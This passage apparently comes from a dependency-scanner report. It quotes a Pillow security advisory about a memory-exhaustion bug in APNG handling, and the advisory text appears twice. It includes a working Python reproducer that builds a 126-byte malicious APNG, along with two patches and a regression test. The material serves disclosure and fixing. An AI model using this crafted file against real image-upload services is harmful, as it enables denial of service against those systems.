\"-c\", OPEN_UNTRUSTED], input=data,\n                       capture_output=True, timeout=60)\n    if p.returncode == -9:  # SIGKILL: OOM-killed on a small host -- also the bug\n        return \"oom-killed(rc=-9)\", None\n    if p.returncode != 0:  # anything else is a harness failure, not evidence\n        print(p.stdout.decode(), p.stderr.decode(), sep=\"\\n\")\n        print(\"child failed unexpectedly (rc=%d)\" % p.returncode)\n        print(\"OK\")\n        sys.exit(1)\n    outcome, peak_mb = p.stdout.split()\n    return outcome.decode(), int(peak_mb)\n\n\ncontrol = build_apng(dispose_op=0)\nattack = build_apng(dispose_op=1)\n\nc_outcome, c_mb = open_in_child(control)\na_outcome, a_mb = open_in_child(attack)\n\nprint(\"%d-byte APNG declaring %dx%d RGBA; Image.open(BytesIO(data)), defaults\"\n      % (len(attack), SIZE, SIZE))\nprint(\"  control  dispose_op=0 OP_NONE        -\u003e %-22s peak RSS %5s MB\" % (c_outcome, c_mb))\nprint(\"  attack   dispose_op=1 OP_BACKGROUND  -\u003e %-22s peak RSS %5s MB\" % (a_outcome, a_mb))\n\n# Expected: both rejected at roughly interpreter size. Bug: the attack file\n# made the \"cheap\" rejection cost a full-size canvas (or killed the process).\nif a_mb is None or (a_mb \u003e= 1000 and a_mb \u003e= 20 * c_mb):\n    print(\"Image.open() touched a full %dx%d canvas before the bomb check ran\"\n          % (SIZE, SIZE))\n    print(\"BUG\")\nelse:\n    print(\"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112399](https://osv.dev/CVE-2026-112399)**.\n\n## [GHSA-5xm2-6676-qcp9](https://osv.dev/GHSA-5xm2-6676-qcp9)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e APNG background disposal allocates full canvas before decompression bomb check\n\u003e Location: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.\n\u003e \n\u003e The bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.\n\u003e \n\u003e Below available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 (\"Use disposal settings from previous frame\", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.\n\u003e \n\u003e ## Details\n\u003e \n\u003e For an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.\n\u003e \n\u003e The following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.\n\u003e \n\u003e ```\n\u003e IHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA)\n\u003e acTL  num_frames=2 num_plays=0\n\u003e fcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0\n\u003e IDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline\n\u003e IEND\n\u003e ```\n\u003e \n\u003e With `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:\n\u003e \n\u003e ```python\n\u003e # src/PIL/Image.py:3699-3701\n\u003e                     im = factory(fp, filename)\n\u003e                     _decompression_bomb_check(im.size)\n\u003e                     return im\n\u003e ```\n\u003e \n\u003e For a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:\n\u003e \n\u003e ```python\n\u003e # src/PIL/PngImagePlugin.py:845-853\n\u003e         if self.png.im_n_frames is not None:\n\u003e             …\n\u003e             self._seek(0)\n\u003e ```\n\u003e \n\u003e `_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:\n\u003e \n\u003e ```python\n\u003e # src/PIL/PngImagePlugin.py:991-1001\n\u003e         if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e             self.dispose_op = Disposal.OP_BACKGROUND\n\u003e \n\u003e         self.dispose = None\n\u003e         if self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e             …\n\u003e         elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e             self.dispose = Image.core.fill(self.mode, self.size)\n\u003e             self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e ```\n\u003e \n\u003e `Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.\n\u003e \n\u003e The only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.\n\u003e \n\u003e The eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` (\"Use disposal settings from previous frame\", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.\n\u003e \n\u003e This is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.\n\u003e \n\u003e The two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:\n\u003e \n\u003e - The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`.\n\u003e - The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check.\n\u003e - The one-scanline `IDAT` ends header parsing.\n\u003e \n\u003e Expected output on this tree:\n\u003e \n\u003e ```\n\u003e 126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults\n\u003e   control  dispose_op=0 OP_NONE        -\u003e DecompressionBombError peak RSS    17 MB\n\u003e   attack   dispose_op=1 OP_BACKGROUND  -\u003e DecompressionBombError peak RSS  1864 MB\n\u003e Image.open() touched a full 22000x22000 canvas before the bomb check ran\n\u003e BUG\n\u003e ```\n\u003e \n\u003e Both files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill(\"RGBA\", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.\n\u003e \n\u003e The allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e Do not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). Attached patch 1 is the preferred fix.\n\u003e \n\u003e **Attached patch 1** moves the fill to its only point of use, the `frame \u003e 0` branch of `_seek()` right after `self.load()` — which can only run once `Image.open()` has returned (bomb check passed) and the canvas itself has been allocated — and, as `GifImagePlugin` already does, fills only the previous frame's dispose extent instead of a full canvas that is then cropped:\n\u003e \n\u003e ```diff\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              # ensure previous frame was loaded\n\u003e              self.load()\n\u003e  \n\u003e +            if self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e +                # Created here rather than in the previous _seek(), so that\n\u003e +                # nothing is allocated from the declared image size before\n\u003e +                # the decompression bomb check in Image.open() has run.\n\u003e +                # Only dispose the extent of the previous frame.\n\u003e +                x0, y0, x1, y1 = self.dispose_extent\n\u003e +                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n\u003e              if self.dispose:\n\u003e                  self.im.paste(self.dispose, self.dispose_extent)\n\u003e              self._prev_im = self.im.copy()\n\u003e @@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              if self._prev_im:\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e -        elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e ```\n\u003e \n\u003e At that point `self.dispose_op` and `self.dispose_extent` still hold the previous frame's values (they are reassigned further down in `_seek`), so disposal semantics are unchanged; the `OP_PREVIOUS` copy stays eager because `load_end()` pastes into `_prev_im` in place (`src/PIL/PngImagePlugin.py:1110`). With this patch `Image.open()` allocates nothing from the declared size, including in the `DecompressionBombWarning` range.\n\u003e \n\u003e **Attached patch 2** is a smaller diff that keeps the eager disposal setup in `_seek()` and mirrors `GifImagePlugin._seek()`'s `OP_BACKGROUND` handling exactly: it computes the size of the `fcTL` rectangle (already validated by `chunk_fcTL` to lie within the image), runs `Image._decompression_bomb_check()` on it, and fills an image of only that size instead of filling `self.size` and cropping. It also narrows the `dispose_extent` annotation to `tuple[int, int, int, int]` so the bomb-check call type-checks. The trade-off is that a full-canvas first frame still allocates a bomb-checked image inside `Image.open()` — up to about 2×`MAX_IMAGE_PIXELS`×4 bytes (660 MB for a 13000×13000 full-frame `fcTL`, with `DecompressionBombWarning`) — and a first `fcTL` covering a canvas above the error threshold now raises `DecompressionBombError` from `_seek(0)` rather than from `Image.open()`'s own check.\n\u003e \n\u003e With either patch applied to a clean checkout, the reproducer prints `OK` and all 54 files in `Tests/images/apng/` decode byte-identically frame by frame, including after a rewind.\n\u003e \n\u003e ## The patch (1 of 2)\n\u003e \n\u003e Create the APNG OP_BACKGROUND disposal image when the next frame is sought, sized to the frame extent, not in _open() from the IHDR size\n\u003e \n\u003e Applies to `src/PIL/PngImagePlugin.py` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\n\u003e index 15689476c..6e61c8b4b 100644\n\u003e --- a/Tests/test_file_apng.py\n\u003e +++ b/Tests/test_file_apng.py\n\u003e @@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n\u003e          assert im.size == (128, 64)\n\u003e  \n\u003e  \n\u003e +def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n\u003e +    # The disposal image must not be created from the declared image size\n\u003e +    # before the decompression bomb check in Image.open() has run.\n\u003e +    # A canvas this wide cannot be allocated, so if it is attempted,\n\u003e +    # a MemoryError is raised instead of a DecompressionBombError.\n\u003e +    o16 = PngImagePlugin.o16\n\u003e +    o32 = PngImagePlugin.o32\n\u003e +\n\u003e +    b = BytesIO()\n\u003e +    b.write(PngImagePlugin._MAGIC)\n\u003e +    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n\u003e +    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n\u003e +    PngImagePlugin.putchunk(\n\u003e +        b,\n\u003e +        b\"fcTL\",\n\u003e +        o32(0),  # sequence number\n\u003e +        o32(1),  # width\n\u003e +        o32(1),  # height\n\u003e +        o32(0),  # x offset\n\u003e +        o32(0),  # y offset\n\u003e +        o16(1),  # delay numerator\n\u003e +        o16(10),  # delay denominator\n\u003e +        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n\u003e +    )\n\u003e +    PngImagePlugin.putchunk(b, b\"IDAT\")\n\u003e +    PngImagePlugin.putchunk(b, b\"IEND\")\n\u003e +\n\u003e +    with pytest.raises(Image.DecompressionBombError):\n\u003e +        Image.open(b)\n\u003e +\n\u003e +\n\u003e  def test_apng_blend() -\u003e None:\n\u003e      with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n\u003e          assert isinstance(im, PngImagePlugin.PngImageFile)\n\u003e diff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\n\u003e index 0eb2fd5e4..24fa587c1 100644\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              # ensure previous frame was loaded\n\u003e              self.load()\n\u003e  \n\u003e +            if self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e +                # Created here rather than in the previous _seek(), so that\n\u003e +                # nothing is allocated from the declared image size before\n\u003e +                # the decompression bomb check in Image.open() has run.\n\u003e +                # Only dispose the extent of the previous frame.\n\u003e +                x0, y0, x1, y1 = self.dispose_extent\n\u003e +                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n\u003e              if self.dispose:\n\u003e                  self.im.paste(self.dispose, self.dispose_extent)\n\u003e              self._prev_im = self.im.copy()\n\u003e @@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e              if self._prev_im:\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e -        elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e  \n\u003e      def tell(self) -\u003e int:\n\u003e          return self.__frame\n\u003e ```\n\u003e \n\u003e ## The patch (2 of 2)\n\u003e \n\u003e Bomb-check and fill only the fcTL extent for APNG OP_BACKGROUND disposal instead of a full IHDR-sized canvas in PngImageFile._seek()\n\u003e \n\u003e Applies to `src/PIL/PngImagePlugin.py` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\n\u003e index 15689476c..6e61c8b4b 100644\n\u003e --- a/Tests/test_file_apng.py\n\u003e +++ b/Tests/test_file_apng.py\n\u003e @@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n\u003e          assert im.size == (128, 64)\n\u003e  \n\u003e  \n\u003e +def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n\u003e +    # The disposal image must not be created from the declared image size\n\u003e +    # before the decompression bomb check in Image.open() has run.\n\u003e +    # A canvas this wide cannot be allocated, so if it is attempted,\n\u003e +    # a MemoryError is raised instead of a DecompressionBombError.\n\u003e +    o16 = PngImagePlugin.o16\n\u003e +    o32 = PngImagePlugin.o32\n\u003e +\n\u003e +    b = BytesIO()\n\u003e +    b.write(PngImagePlugin._MAGIC)\n\u003e +    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n\u003e +    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n\u003e +    PngImagePlugin.putchunk(\n\u003e +        b,\n\u003e +        b\"fcTL\",\n\u003e +        o32(0),  # sequence number\n\u003e +        o32(1),  # width\n\u003e +        o32(1),  # height\n\u003e +        o32(0),  # x offset\n\u003e +        o32(0),  # y offset\n\u003e +        o16(1),  # delay numerator\n\u003e +        o16(10),  # delay denominator\n\u003e +        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n\u003e +    )\n\u003e +    PngImagePlugin.putchunk(b, b\"IDAT\")\n\u003e +    PngImagePlugin.putchunk(b, b\"IEND\")\n\u003e +\n\u003e +    with pytest.raises(Image.DecompressionBombError):\n\u003e +        Image.open(b)\n\u003e +\n\u003e +\n\u003e  def test_apng_blend() -\u003e None:\n\u003e      with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n\u003e          assert isinstance(im, PngImagePlugin.PngImageFile)\n\u003e diff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\n\u003e index 0eb2fd5e4..0111a17d7 100644\n\u003e --- a/src/PIL/PngImagePlugin.py\n\u003e +++ b/src/PIL/PngImagePlugin.py\n\u003e @@ -985,7 +985,7 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e                  msg = \"image not found in APNG frame\"\n\u003e                  raise EOFError(msg)\n\u003e          if dispose_extent:\n\u003e -            self.dispose_extent: tuple[float, float, float, float] = dispose_extent\n\u003e +            self.dispose_extent: tuple[int, int, int, int] = dispose_extent\n\u003e  \n\u003e          # setup frame disposal (actual disposal done when needed in the next _seek())\n\u003e          if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n\u003e @@ -997,8 +997,14 @@ class PngImageFile(ImageFile.ImageFile):\n\u003e                  self.dispose = self._prev_im.copy()\n\u003e                  self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e          elif self.dispose_op == Disposal.OP_BACKGROUND:\n\u003e -            self.dispose = Image.core.fill(self.mode, self.size)\n\u003e -            self.dispose = self._crop(self.dispose, self.dispose_extent)\n\u003e +            # only dispose the extent in this frame, rather than filling an\n\u003e +            # image of the declared size before Image.open() has been able to\n\u003e +            # run the decompression bomb check\n\u003e +            x0, y0, x1, y1 = self.dispose_extent\n\u003e +            dispose_size = (x1 - x0, y1 - y0)\n\u003e +\n\u003e +            Image._decompression_bomb_check(dispose_size)\n\u003e +            self.dispose = Image.core.fill(self.mode, dispose_size)\n\u003e  \n\u003e      def tell(self) -\u003e int:\n\u003e          return self.__frame\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,564 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"\n\u003e Image.open() on a 126-byte APNG allocates and zero-fills a full canvas of the\n\u003e header-declared size *before* Pillow's decompression-bomb check rejects it.\n\u003e \n\u003e We build two PNGs that are identical except for one byte, the first fcTL\n\u003e chunk's dispose_op:\n\u003e \n\u003e     control: dispose_op = 0  (OP_NONE)\n\u003e     attack:  dispose_op = 1  (OP_BACKGROUND)\n\u003e \n\u003e Both declare 22000x22000 RGBA (484 Mpixel, above the 2 * MAX_IMAGE_PIXELS\n\u003e error threshold), so Image.open() must reject both with DecompressionBombError\n\u003e -- and that check exists precisely so the rejection is cheap. For the attack\n\u003e file, PngImageFile._open() -\u003e _seek(0) first runs\n\u003e Image.core.fill(mode, (22000, 22000)), touching ~1.9 GB, and only then is the\n\u003e bomb check reached.\n\u003e \n\u003e Each file is opened in a fresh interpreter that reports its own peak RSS.\n\u003e \"\"\"\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import zlib\n\u003e \n\u003e SIZE = 22000  # 22000 * 22000 * 4 bytes = 1.94 GB canvas\n\u003e \n\u003e \n\u003e def chunk(cid, data):\n\u003e     crc = zlib.crc32(cid + data)\n\u003e     return struct.pack(\"\u003eI\", len(data)) + cid + data + struct.pack(\"\u003eI\", crc)\n\u003e \n\u003e \n\u003e def build_apng(dispose_op):\n\u003e     ihdr = struct.pack(\"\u003eIIBBBBB\", SIZE, SIZE, 8, 6, 0, 0, 0)  # 8-bit RGBA\n\u003e     actl = struct.pack(\"\u003eII\", 2, 0)  # animated: 2 frames -\u003e _open() calls _seek(0)\n\u003e     # frame 0: seq 0, a 1x1 rectangle at (0,0) (passes fcTL's bounds check),\n\u003e     # delay 1/10 s, the dispose_op under test, blend_op 0\n\u003e     fctl = struct.pack(\"\u003eIIIIIHHBB\", 0, 1, 1, 0, 0, 1, 10, dispose_op, 0)\n\u003e     idat = zlib.compress(b\"\\x00\" + b\"\\x00\\x00\\x00\\x00\")  # one 1x1 RGBA scanline\n\u003e     return (b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", ihdr) + chunk(b\"acTL\", actl)\n\u003e             + chunk(b\"fcTL\", fctl) + chunk(b\"IDAT\", idat) + chunk(b\"IEND\", b\"\"))\n\u003e \n\u003e \n\u003e # What an application does with an untrusted upload: Image.open() with default\n\u003e # settings, no load(). Prints the outcome and this process's peak RSS in MB.\n\u003e OPEN_UNTRUSTED = \"\"\"\n\u003e import io, resource, sys\n\u003e from PIL import Image\n\u003e try:\n\u003e     Image.open(io.BytesIO(sys.stdin.buffer.read()))\n\u003e     outcome = \"opened\"\n\u003e except Exception as e:\n\u003e     outcome = type(e).__name__\n\u003e print(outcome, resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024)\n\u003e \"\"\"\n\u003e \n\u003e \n\u003e def open_in_child(data):\n\u003e     p = subprocess.run([sys.executable, \"-c\", OPEN_UNTRUSTED], input=data,\n\u003e                        capture_output=True, timeout=60)\n\u003e     if p.returncode == -9:  # SIGKILL: OOM-killed on a small host -- also the bug\n\u003e         return \"oom-killed(rc=-9)\", None\n\u003e     if p.returncode != 0:  # anything else is a harness failure, not evidence\n\u003e         print(p.stdout.decode(), p.stderr.decode(), sep=\"\\n\")\n\u003e         print(\"child failed unexpectedly (rc=%d)\" % p.returncode)\n\u003e         print(\"OK\")\n\u003e         sys.exit(1)\n\u003e     outcome, peak_mb = p.stdout.split()\n\u003e     return outcome.decode(), int(peak_mb)\n\u003e \n\u003e \n\u003e control = build_apng(dispose_op=0)\n\u003e attack = build_apng(dispose_op=1)\n\u003e \n\u003e c_outcome, c_mb = open_in_child(control)\n\u003e a_outcome, a_mb = open_in_child(attack)\n\u003e \n\u003e print(\"%d-byte APNG declaring %dx%d RGBA; Image.open(BytesIO(data)), defaults\"\n\u003e       % (len(attack), SIZE, SIZE))\n\u003e print(\"  control  dispose_op=0 OP_NONE        -\u003e %-22s peak RSS %5s MB\" % (c_outcome, c_mb))\n\u003e print(\"  attack   dispose_op=1 OP_BACKGROUND  -\u003e %-22s peak RSS %5s MB\" % (a_outcome, a_mb))\n\u003e \n\u003e # Expected: both rejected at roughly interpreter size. Bug: the attack file\n\u003e # made the \"cheap\" rejection cost a full-size canvas (or killed the process).\n\u003e if a_mb is None or (a_mb \u003e= 1000 and a_mb \u003e= 20 * c_mb):\n\u003e     print(\"Image.open() touched a full %dx%d canvas before the bomb check ran\"\n\u003e           % (SIZE, SIZE))\n\u003e     print(\"BUG\")\n\u003e else:\n\u003e     print(\"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5xm2-6676-qcp9 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112399\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112399](https://osv.dev/CVE-2026-112399)**.\n\n## [GHSA-5xm2-6676-qcp9](https://osv.dev/GHSA-5xm2-6676-qcp9)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e APNG background disposal allocates full canvas before decompression bomb check\n\u003e Location: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.\n\u003e \n\u003e The bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.\n\u003e \n\u003e Below available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 (\"Use disposal settings from previous frame\", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.\n\u003e \n\u003e ## Details\n\u003e \n\u003e For an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full 